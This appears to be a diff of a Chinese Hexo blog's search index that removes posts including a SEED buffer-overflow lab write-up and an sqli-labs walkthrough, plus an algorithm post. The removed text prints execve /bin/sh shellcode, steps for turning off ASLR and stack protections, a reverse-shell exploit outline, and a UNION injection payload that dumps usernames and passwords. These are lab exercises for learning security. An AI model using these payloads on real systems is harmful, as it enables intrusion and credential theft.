 <p>格式字符串的使用不仅限于 <code>printf()</code> 函数，许多其他函数，如 <code>sprintf()</code>、<code>fprintf()</code> 和 <code>scanf() </code>，也使用格式字符串。</p>
 <p>有些程序允许用户以格式字符串的形式提供全部或部分内容。如果这些内容没有被清除，恶意用户可以利用这个机会让程序运行任意代码。</p>
 <p>这样的问题称为 <code>format string vulnerability</code> （格式字符串漏洞）。</p>
-<p>实验目的是让学生通过运用在课堂上学到的关于格式字符串漏洞的知识实际操作，从而获得关于格式字符串漏洞的第一手经验。</p>
+<p>实验目的是让学生通过运用在课 堂上学到的关于格式字符串漏洞的知识实际操作，从而获得关于格式字符串漏洞的第一手经验。</p>
 <p>学生将被给予一个具有格式字符串漏洞的程序，他们的任务是利用这个漏洞来实现以下破坏:</p>
 <ol>
 <li><p>使程序崩溃</p>
@@ -786,173 +953,6 @@
       </tags>
   </entry>
   <entry>
-    <title>SEED 2.0 Softwarelab3:Buffer Overflow Attack Lab</title>
-    <url>/2021/11/09/SEED_lab3/</url>
-    <content><![CDATA[<h1 id="Buffer-Overflow-Attack-Lab"><a href="#Buffer-Overflow-Attack-Lab" class="headerlink" title="Buffer Overflow Attack Lab"></a>Buffer Overflow Attack Lab</h1><h2 id="Set-UID版本"><a href="#Set-UID版本" class="headerlink" title="Set-UID版本"></a>Set-UID版本</h2><h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>缓冲区溢出指的是程序试图将数据写入缓冲区以外的情况。</p>
-<p>这种漏洞可以由恶意用户使用来改变程序的流量控制，导致执行恶意代码</p>
-<p>本实验的目标是为学生提供对这种类型的漏洞的实用洞察力，并学习如何利用攻击中的漏洞</p>
-<h3 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h3><h4 id="关闭地址空间随机化"><a href="#关闭地址空间随机化" class="headerlink" title="关闭地址空间随机化"></a>关闭地址空间随机化</h4><p>系统会随机化堆和堆栈的起始地址。猜测地址是缓冲溢出攻击的关键步骤之一。可以使用以下命令丢弃此功能：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo sysctl -w kernel.randomize_va_space</span><br></pre></td></tr></table></figure>
-
-<h4 id="配置-bin-sh"><a href="#配置-bin-sh" class="headerlink" title="配置/bin/sh"></a>配置/bin/sh</h4><p>因为现在/bin/sh符号链接指向/bin/dash，而在第一次实验中，我们知道dash对set-UID程序有个安全策略，放弃特权。</p>
-<p>所以我们需要改变符号链接到/bin/zsh，使用如下命令：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ln -sf /bin/zsh /bin/sh</span><br></pre></td></tr></table></figure>
-
-<h4 id="StackGuard和不可执行栈"><a href="#StackGuard和不可执行栈" class="headerlink" title="StackGuard和不可执行栈"></a>StackGuard和不可执行栈</h4><p>这个会在编译时关闭，这两个也是保护程序安全的策略，之后会讨论</p>
-<h3 id="Task-1-Getting-Familiar-with-Shellcode"><a href="#Task-1-Getting-Familiar-with-Shellcode" class="headerlink" title="Task 1: Getting Familiar with Shellcode"></a>Task 1: Getting Familiar with Shellcode</h3><p>提供三个版本的shellcode：c版本、32-bit和64-bit，这里只提供c</p>
-<h4 id="c-version"><a href="#c-version" class="headerlink" title="c version"></a>c version</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *name[<span class="number">2</span>];</span><br><span class="line">    name[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    name[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    execve(name[<span class="number">0</span>], name, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//意思是，shellcode就是调用了一个/bin/sh</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="Task-Invoking-the-Shellcode"><a href="#Task-Invoking-the-Shellcode" class="headerlink" title="Task: Invoking the Shellcode"></a>Task: Invoking the Shellcode</h4><p>源码如下：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> shellcode[] =                     <span class="comment">//就是汇编代码的二进制形式</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __x86_64__                              </span></span><br><span class="line">    <span class="string">&quot;\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57&quot;</span></span><br><span class="line">    <span class="string">&quot;\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f&quot;</span></span><br><span class="line">    <span class="string">&quot;\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31&quot;</span></span><br><span class="line">    <span class="string">&quot;\xd2\x31\xc0\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> code[<span class="number">500</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(code, shellcode); <span class="comment">// Copy the shellcode to the stack</span></span><br><span class="line">    <span class="keyword">int</span> (*func)() = (<span class="keyword">int</span>(*)())code;</span><br><span class="line">    func(); <span class="comment">// Invoke the shellcode from the stack</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>因为已经提供了Makefile文件，所以可以很简单的实现</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make             <span class="comment">#生成a32.out和a64.out</span></span><br><span class="line">./a32.out        <span class="comment">#调用shell </span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Task-2-Understanding-the-Vulnerable-Program"><a href="#Task-2-Understanding-the-Vulnerable-Program" class="headerlink" title="Task 2: Understanding the Vulnerable Program"></a>Task 2: Understanding the Vulnerable Program</h3><p>从源码审计知道：</p>
-<ol>
-<li>漏洞出在bof函数中的<code>strcpy(buffer, str)</code>函数</li>
-<li>我们需要在badfile文件中填入payload造成缓冲区溢出漏洞</li>
-</ol>
-<p>准备四个难度的Level，已经提供了相应的Makefile</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make                     <span class="comment"># 利用以下命令生成4个Level</span></span><br><span class="line"><span class="comment"># gcc -DBUF_SIZE=100 -m32 -o stack -z execstack -fno-stack-protector stack.c </span></span><br><span class="line"><span class="comment"># sudo chown root stack</span></span><br><span class="line"><span class="comment"># sudo chmod 4755 stack</span></span><br><span class="line"><span class="comment"># 知道程序是32位程序，编译时关闭了前面提到的两个安全策略，最后是属于root用户的set-uid程序</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Task-3-Launching-Attack-on-32-bit-Program-Level-1"><a href="#Task-3-Launching-Attack-on-32-bit-Program-Level-1" class="headerlink" title="Task 3: Launching Attack on 32-bit Program (Level 1)"></a>Task 3: Launching Attack on 32-bit Program (Level 1)</h3><p>按如下步骤发动缓冲区溢出攻击：</p>
-<ol>
-<li><code>gdb stack-L1-dbg</code>得到bof函数的地址以及buffer的地址<br><img src="/2021/11/09/SEED_lab3/image-20211110172748213.png" alt="image-20211110172748213"></li>
-<li>创建badfile文件，<code>touch badfile</code></li>
-<li>修改exploit.py文件<br><img src="/2021/11/09/SEED_lab3/image-20211110173007659.png" alt="image-20211110173007659"></li>
-<li>生成payload并攻击<br><img src="/2021/11/09/SEED_lab3/image-20211110173120280.png" alt="image-20211110173120280"></li>
-<li>可以看到我们成功拿到root权限</li>
-</ol>
-<p>如何修改exploit？</p>
-<ol>
-<li>shellcode是复制的，就是shellcode的32bit汇编版本</li>
-<li>ret是返回地址，返回shellcode的第一条指令</li>
-<li>offset是ebp和buffer地址的间隔</li>
-<li>L等于4是32位程序</li>
-</ol>
-<h3 id="Task-4-Launching-Attack-without-Knowing-Buffer-Size-Level-2"><a href="#Task-4-Launching-Attack-without-Knowing-Buffer-Size-Level-2" class="headerlink" title="Task 4: Launching Attack without Knowing Buffer Size (Level 2)"></a>Task 4: Launching Attack without Knowing Buffer Size (Level 2)</h3><p>不知道缓冲区大小，但是知道缓冲区大小的范围是100-200</p>
-<p>所以我们其实不知道的是offset的大小，只查看buffer的地址吧。</p>
-<p><img src="/2021/11/09/SEED_lab3/image-20211110203921358.png" alt="image-20211110203921358"></p>
-<p>修改exploit.py</p>
-<p><img src="/2021/11/09/SEED_lab3/image-20211110204203357.png" alt="image-20211110204203357"></p>
-<p>攻击成功</p>
-<p><img src="/2021/11/09/SEED_lab3/image-20211110204241360.png" alt="image-20211110204241360"></p>
-<h3 id="Task-5-Launching-Attack-on-64-bit-Program-Level-3"><a href="#Task-5-Launching-Attack-on-64-bit-Program-Level-3" class="headerlink" title="Task 5: Launching Attack on 64-bit Program (Level 3)"></a>Task 5: Launching Attack on 64-bit Program (Level 3)</h3><p>同上一个任务类似，但是这次是64位的程序</p>
-<h2 id="Server版本"><a href="#Server版本" class="headerlink" title="Server版本"></a>Server版本</h2><h3 id="Overview-1"><a href="#Overview-1" class="headerlink" title="Overview"></a>Overview</h3><p>缓冲区溢出指的是程序试图将数据写入缓冲区以外的情况。</p>
-<p>这种漏洞可以由恶意用户使用来改变程序的流量控制，导致执行恶意代码</p>
-<p>本实验的目标是为学生提供对这种类型的漏洞的实用洞察力，并学习如何利用攻击中的漏洞</p>
-<h3 id="Lab-Environment-Setup"><a href="#Lab-Environment-Setup" class="headerlink" title="Lab Environment Setup"></a>Lab Environment Setup</h3><h4 id="关闭地址空间随机化-1"><a href="#关闭地址空间随机化-1" class="headerlink" title="关闭地址空间随机化"></a>关闭地址空间随机化</h4><p>ALSR对程序内存中的一些关键数据区域进行随机化，包括栈的位置、堆和库的位置等。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /sbin/sysctl -w kernel.randomize_va_space=0</span><br></pre></td></tr></table></figure>
-
-<h4 id="漏洞程序"><a href="#漏洞程序" class="headerlink" title="漏洞程序"></a>漏洞程序</h4><p>实验所用的漏洞程序是<code>server-code</code>文件夹的<code>stack.c</code>程序。</p>
-<p>我们的任务是利用这个漏洞得到root权限。</p>
-<p>程序拥有root权限，运行在一个服务器中，它的标准输入被重定向到一个在远程用户和服务器之间的TCP连接。</p>
-<p>就是说，程序能从一个远程用户得到数据。</p>
-<p>要编译上述漏洞程序，我们需要使用<code>-fno-stack-protector</code>和<code>-z execstack</code>选项关闭StackGuard和非可执行堆栈保护，<code>L1</code>设置为具体的值</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -DBUF_SIZE=$(L1) -o stack -z execstack -fno-stack-protector stack.c          <span class="comment"># 我设置的L1为250</span></span><br></pre></td></tr></table></figure>
-
-<p>在文件夹，通过<code>make</code>命令去按照<code>Makefile</code>编译程序，然后<code>make install</code>命令安装，让编译得到的二进制能够被容器使用。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/11/09/SEED_lab3/image-20211109151506071.png" alt="image-20211109151506071"></p>
-<p><code>server-code</code>文件夹里的<code>server.c</code>是服务器入口点，监听9090端口</p>
-<p>当收到TCP连接时，会将TCP收到的数据作为标准输入到<code>stack</code>程序，我们没必要去读<code>server.c</code>的源码。</p>
-<h4 id="容器搭建和命令"><a href="#容器搭建和命令" class="headerlink" title="容器搭建和命令"></a>容器搭建和命令</h4><p>起环境，docker容器</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dcbuild      <span class="comment"># alias for: docker-compose build</span></span><br><span class="line">dcup         <span class="comment"># alias for: docker-compose up</span></span><br><span class="line">dcdown       <span class="comment"># alias for: docker-compose down</span></span><br><span class="line">dockps       <span class="comment"># Alias for: docker ps --format &quot;&#123;&#123;.ID&#125;&#125; &#123;&#123;.Names&#125;&#125;&quot;</span></span><br><span class="line">docksh &lt;id&gt;  <span class="comment"># Alias for: docker exec -it &lt;id&gt; /bin/bash</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="Task-1-Get-Familiar-with-the-Shellcode"><a href="#Task-1-Get-Familiar-with-the-Shellcode" class="headerlink" title="Task 1: Get Familiar with the Shellcode"></a>Task 1: Get Familiar with the Shellcode</h3><p>Shellcode通常被用在代码注入攻击。它基本上是一段启动shell的代码，通常用汇编语言编写。</p>
-<p>在本实验中只提供二进制版本的shellcode</p>
-<ol>
-<li><p>生成32位和64位二进制shellcode文件<code>codefile32</code>和<code>codefile64</code></p>
-<p><img src="/2021/11/09/SEED_lab3/image-20211109161302510.png" alt="image-20211109161302510"></p>
-</li>
-<li><p>编译<code>call_shellcode.c</code>，我们可以使用<code>a32.out</code>和<code>a64.out</code>来分别调用上一步生成的shellcode文件<br><img src="/2021/11/09/SEED_lab3/image-20211109162148430.png" alt="image-20211109162148430"></p>
-</li>
-<li><p>测试shellcode<br><img src="/2021/11/09/SEED_lab3/image-20211109163524900.png" alt="image-20211109163524900"></p>
-</li>
-<li><p>修改shellcode，可以用来删除文件，<br><img src="/2021/11/09/SEED_lab3/image-20211109223939250.png" alt="image-20211109223939250"><br><img src="/2021/11/09/SEED_lab3/image-20211109223844600.png" alt="image-20211109223844600"></p>
-</li>
-</ol>
-<h3 id="Task-2-Level-1-Attack"><a href="#Task-2-Level-1-Attack" class="headerlink" title="Task 2: Level-1 Attack"></a>Task 2: Level-1 Attack</h3><p>第一个目标是10.9.0.0端口是9090，漏洞程序stack是32位程序。</p>
-<p>服务器将接受517字节的输入，会造成缓冲区溢出。</p>
-<ol>
-<li>先测试我们的服务器是否正常、<br><img src="/2021/11/09/SEED_lab3/image-20211109225003621.png" alt="image-20211109225003621"><br>正常返回，我们得到了栈帧指针的值<code>ebp</code>和buffer的地址</li>
-<li>我们修改位于<code>attack-code</code>文件夹下面的<code>exploit.py</code>，构造我们的payload<br><img src="/2021/11/09/SEED_lab3/image-20211109230829919.png" alt="image-20211109230829919"><br><img src="/2021/11/09/SEED_lab3/image-20211109231006268.png" alt="image-20211109231006268"></li>
-<li>监听9090端口，反向shell得到root权限<br><img src="/2021/11/09/SEED_lab3/image-20211109232608115.png" alt="image-20211109232608115"></li>
-</ol>
-<p>Level-1给了2个Hint：</p>
-<ol>
-<li>ebp地址</li>
-<li>buffer地址</li>
-</ol>
-<p>从hint中我们得到buffer的大小为offset，构造content，也就是最后badfile文件内容：</p>
-<ol>
-<li>先用NOP空指令将content数组填充</li>
-<li>[0:offset]，内容是NOP指令，缓冲区数据。</li>
-<li>[offset:offset+4]，就是ret指令返回的地址（小端法），我们要执行恶意代码，最小为ebp+8最大为517-len(shellcode)</li>
-<li>[517-len(shellcode):517]，填充shellcode恶意代码</li>
-</ol>
-<h3 id="Task-3-Level-2-Attack"><a href="#Task-3-Level-2-Attack" class="headerlink" title="Task 3: Level-2 Attack"></a>Task 3: Level-2 Attack</h3><p>为了增加难度，在本任务中将不会给出ebp地址</p>
-<p><img src="/2021/11/09/SEED_lab3/image-20211110140909438.png" alt="image-20211110140909438"></p>
-<p>如图所示只给出了buffer的地址，我们不知道buffer的大小。</p>
-<p>同时，为了降低难度，缓冲区的大小被设定为<code>[100,300]</code>。</p>
-<p>所以解法是暴力枚举，每个大小都试一下</p>
-]]></content>
-      <categories>
-        <category>软件安全</category>
-      </categories>
-      <tags>
-        <tag>课程作业</tag>
-        <tag>Lab</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Sqli-lab靶场</title>
-    <url>/2021/05/25/Sqli-lab%E9%9D%B6%E5%9C%BA/</url>
-    <content><![CDATA[<h1 id="Sqli-lab靶场"><a href="#Sqli-lab靶场" class="headerlink" title="Sqli-lab靶场"></a>Sqli-lab靶场</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通过win10 docker搭建，80端口映射到本机的8888端口。</p>
-<p>通过这个靶场可以系统学习sqli</p>
-<h2 id="Basic-Chanlleges"><a href="#Basic-Chanlleges" class="headerlink" title="Basic Chanlleges"></a>Basic Chanlleges</h2><p><img src="/2021/05/25/Sqli-lab%E9%9D%B6%E5%9C%BA/image-20211025130228841-16351381501851.png" alt="image-20211025130228841"></p>
-<h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><p>GET传参-基于报错-单引号-字符串</p>
-<p><code>?id=1</code>有两个回显，存在注入点</p>
-<p><code>?id=1&#39;</code>出现报错，是<code>MySQL</code>报错，我们该学习如何去看报错<br><img src="/2021/05/25/Sqli-lab%E9%9D%B6%E5%9C%BA/image-20211025153901539.png" alt="image-20211025153901539"></p>
-<p>在上图的near后面是<code>&#39;&#39;1&#39;&#39; LIMIT 0,1&#39;</code>，我们去掉左右两个引号出错的的地方是<code>&#39;1&#39;&#39; LIMIT 0,1</code>，只有三个<code>&#39;</code>，所以语法错误。</p>
-<p>union 联合查询，将两个select语句的查询结果一起返回，回显到我们的页面。</p>
-<p>但是需要注意的是，两个select的列数要一样，才能回显。</p>
-<p><code>?id=&#39; union select 1,2,3--+</code>，不仅可以得到列数，还可以得到回显的位置</p>
-<p><img src="/2021/05/25/Sqli-lab%E9%9D%B6%E5%9C%BA/image-20211025162213822.png" alt="image-20211025162213822"></p>
-<p>所以2,3都是回显的位置，所以接下来可以使用hackbar的一些语句去获得mysql的数据了。</p>
-<p><img src="/2021/05/25/Sqli-lab%E9%9D%B6%E5%9C%BA/image-20211025162502494.png" alt="image-20211025162502494"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; UNION SELECT 1,2,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)--+</span><br></pre></td></tr></table></figure>
-
-<p>0x3c62723e是<code>&lt;br&gt;</code>的hex编码。</p>
-<p>将表名使用hex编码或者利用CHAR()函数，可以绕过单引号限制</p>
-<h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><p>GET传参-基于报错-基于整型</p>
-<p>根据报错判断出id是一个整型的注入点，不需要闭合，接下来就和上一题一样</p>
-<h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p>GET传参-基于报错-带括号的单引号</p>
-<p><img src="/2021/05/25/Sqli-lab%E9%9D%B6%E5%9C%BA/image-20211025184518768.png" alt="image-20211025184518768"></p>
-<p>根据报错判断闭合方式为<code>?id=1&#39;) </code>，其他同上</p>
-<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>GET传参-基于报错-双引号</p>
-<p><img src="/2021/05/25/Sqli-lab%E9%9D%B6%E5%9C%BA/image-20211025185000471.png" alt="image-20211025185000471"></p>
-<p>根据报错，闭合方式为<code>?id=1&quot;)</code>，其他同上</p>
-<h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p>GET传参-二次注入-单引号-字符串</p>
-<p>与前面的改变是select没有回显，也就是说不能使用union联合注入查询数据库信息。</p>
-<p><img src="/2021/05/25/Sqli-lab%E9%9D%B6%E5%9C%BA/image-20211025190605757.png" alt="image-20211025190605757"></p>
-<p>根据报错，与Less-1的闭合方式相同是<code>?id=1&#39;</code></p>
-<p>这道题需要用的是报错注入，hackbar自己提供了一个基于extractvalue()函数的报错注入</p>
-<p><img src="/2021/05/25/Sqli-lab%E9%9D%B6%E5%9C%BA/image-20211025202543008.png" alt="image-20211025202543008"></p>
-<p>成功报错得到数据库名</p>
-<p><img src="/2021/05/25/Sqli-lab%E9%9D%B6%E5%9C%BA/image-20211025202703212.png" alt="image-20211025202703212"></p>
-<h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><p>GET传参-二次注入-双引号-字符串</p>
-]]></content>
-      <categories>
-        <category>CS:APP</category>
-      </categories>
-      <tags>
-        <tag>课程作业</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>hexo写作——我的第一篇博客</title>
     <url>/2021/04/04/hexo%E5%86%99%E4%BD%9C%E2%80%94%E2%80%94%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
     <content><![CDATA[<blockquote>
@@ -1091,10 +1091,13 @@
 <p>也可以以下命令查看是否成功：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls <span class="variable">$KERNEL</span>/vmlinux</span><br><span class="line"><span class="comment"># sample output - $KERNEL/vmlinux</span></span><br><span class="line">ls <span class="variable">$KERNEL</span>/arch/x86/boot/bzImage</span><br><span class="line"><span class="comment"># sample output - $KERNEL/arch/x86/boot/bzImage</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="配置-ext4-硬盘镜像文件"><a href="#配置-ext4-硬盘镜像文件" class="headerlink" title="配置 ext4 硬盘镜像文件"></a>配置 ext4 硬盘镜像文件</h3><p>安装<code>debootstrap</code>工具，可以用来构建最基本的系统。</p>
+<h3 id="创建镜像"><a href="#创建镜像" class="headerlink" title="创建镜像"></a>创建镜像</h3><p>安装<code>debootstrap</code>工具，可以用来构建最基本的系统。</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install debootstrap</span><br></pre></td></tr></table></figure>
 
-<p>创建</p>
+<p>创建 Debian Stretch Linux 镜像（<code>$IMAGE</code> 替换为你想要的目录）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir <span class="variable">$IMAGE</span></span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$IMAGE</span>/</span><br><span class="line">wget https://raw.githubusercontent.com/google/syzkaller/master/tools/create-image.sh -O create-image.sh</span><br><span class="line">chmod +x create-image.sh</span><br><span class="line">./create-image.sh</span><br></pre></td></tr></table></figure>
+
+<p>完成后应该可以找到<code>$IMAGE/stretch.img</code> 这个文件就是构建好的磁盘镜像文件</p>
 ]]></content>
       <categories>
         <category>pwn</category>
@@ -1121,42 +1124,6 @@
       </categories>
       <tags>
         <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>动态规划算法——双机调度问题</title>
-    <url>/2021/04/05/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E7%AE%97%E6%B3%95%E2%80%94%E2%80%94%E5%8F%8C%E6%9C%BA%E8%B0%83%E5%BA%A6%E9%97%AE%E9%A2%98/</url>
-    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述:"></a>问题描述:</h3><p>用2台处理机<code>A</code>和<code>B</code>处理<code>n</code>个作业。设第<code>i</code>个作业交给机器A处理时需要时间<code>ai</code>，若由机器<code>B</code>来处理,则需要时间bi。</p>
-<p>由于各作业的特点和机器的性能关系，很可能对于某些<code>i</code>，有<code>ai ≥ bi</code>，而对于某些<code>j ≠ i</code>，有<code>aj &lt; bj</code>。既不能将一个作业分开由2台机器处理，也没有一台机器能同时处理2个作业。</p>
-<p>研究一个实例:</p>
-<p><code>(a1, a2, a3, a4, a5, a6) = (2, 5, 7, 10, 5, 2)</code></p>
-<p><code>(b1, b2, b3, b4, b5, b6) = (3, 8, 4, 11, 3, 4)</code></p>
-<h3 id="算法设计"><a href="#算法设计" class="headerlink" title="算法设计:"></a>算法设计:</h3><p>对于给定的n个作业，找出一个最优调度方案，使<code>A</code>、<code>B</code>两台机器处理完这n个作业的时间最短。</p>
-<h3 id="数据输入"><a href="#数据输入" class="headerlink" title="数据输入:"></a>数据输入:</h3><p>由文件<code>input. txt</code>提供输入数据。</p>
-<p>文件的第1行是1个正整数<code>n</code>,表示要处理<code>n</code>个作业</p>
-<p>在接下来的2行中,每行有n个正整数，分别表示处理机<code>A</code>和<code>B</code>处理第<code>i</code>个作业需要的处理时间。</p>
-<h3 id="结果输出"><a href="#结果输出" class="headerlink" title="结果输出:"></a>结果输出:</h3><p>将计算出的最短处理时间输出到文件<code>output txt</code>。</p>
-<ul>
-<li><p>输入文件示例</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">input.txt</span><br><span class="line"></span><br><span class="line">6</span><br><span class="line">2 5 7 10 5 2</span><br><span class="line">3 8 4 11 3 4</span><br></pre></td></tr></table></figure></li>
-<li><p>输出文件示例</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">output.txt</span><br><span class="line"></span><br><span class="line">15</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="算法思路"><a href="#算法思路" class="headerlink" title="算法思路"></a>算法思路</h2><ul>
-<li>找出<code>n</code>个任务所有耗时中最大的数<code>m</code>，也就是<code>A</code>和<code>B</code>数组的最大值。</li>
-<li>设置三维布尔量数组<code>p[mn][mn][n]</code>，布尔量<code>p[i][j][k]</code>表示前<code>k</code>个作业可以在处理机<code>A</code>用时不超过<code>i</code>，处理机B不超过<code>j</code>的时间内完成。动态规划算法：<code>p[i][j][k] = p[i-ak][j][k-1] | p[i][j-bk][k-1]</code>（<code>|</code>为按位与运算符）</li>
-<li>由上一步所得的结果我们可以找到时间最短的答案，具体是遍历布尔量为1的<code>k = n</code>的数组，取<code>min(i, j)</code>，如果比前一个小则取这个</li>
-<li>具体算法如下</li>
-</ul>
-<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read</span><span class="params">( )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ifstream infile ;</span><br><span class="line">	infile.<span class="built_in">open</span>( <span class="string">&quot;input.txt&quot;</span> ) ;</span><br><span class="line">	infile &gt;&gt; n ;</span><br><span class="line">	</span><br><span class="line">	a = <span class="keyword">new</span> <span class="keyword">int</span>[n] ;</span><br><span class="line">	b = <span class="keyword">new</span> <span class="keyword">int</span>[n] ;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>( <span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; n ; i ++ )</span><br><span class="line">	&#123;</span><br><span class="line">		infile &gt;&gt; a[i] ;</span><br><span class="line">		m = <span class="built_in">max</span>( a[i] , m ) ;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>( <span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; n ; i ++ )</span><br><span class="line">	&#123;</span><br><span class="line">		infile &gt;&gt; b[i] ;</span><br><span class="line">		m = <span class="built_in">max</span>( b[i] , m ) ;</span><br><span class="line">	&#125;</span><br><span class="line">	mn = m * n ;</span><br><span class="line">	</span><br><span class="line">	infile.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dyna</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">bool</span>*** p = <span class="keyword">new</span> <span class="keyword">bool</span>** [mn+<span class="number">1</span>] ;</span><br><span class="line">	<span class="keyword">for</span>( <span class="keyword">int</span> i = <span class="number">0</span> ; i &lt;= mn ; i ++ )</span><br><span class="line">	&#123;</span><br><span class="line">		p[i] = <span class="keyword">new</span> <span class="keyword">bool</span>* [mn+<span class="number">1</span>] ;</span><br><span class="line">		<span class="keyword">for</span>( <span class="keyword">int</span> j = <span class="number">0</span> ; j &lt;= mn ; j++ )</span><br><span class="line">		&#123;</span><br><span class="line">			p[i][j] = <span class="keyword">new</span> <span class="keyword">bool</span> [n+<span class="number">1</span>] ;</span><br><span class="line">			p[i][j][<span class="number">0</span>] = <span class="literal">true</span> ;</span><br><span class="line">			<span class="keyword">for</span>( <span class="keyword">int</span> k = <span class="number">1</span> ; k &lt;= n ; k ++ )</span><br><span class="line">			&#123;</span><br><span class="line">				p[i][j][k] = <span class="literal">false</span> ;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>( <span class="keyword">int</span> k = <span class="number">1</span> ; k &lt;= n ; k ++ )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>( <span class="keyword">int</span> i = <span class="number">0</span> ; i &lt;= mn ; i++ )</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span>( <span class="keyword">int</span> j = <span class="number">0</span> ; j &lt;= mn ; j++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>( i - a[k<span class="number">-1</span>] &gt;= <span class="number">0</span> ) p[i][j][k] = p[i-a[k<span class="number">-1</span>]][j][k<span 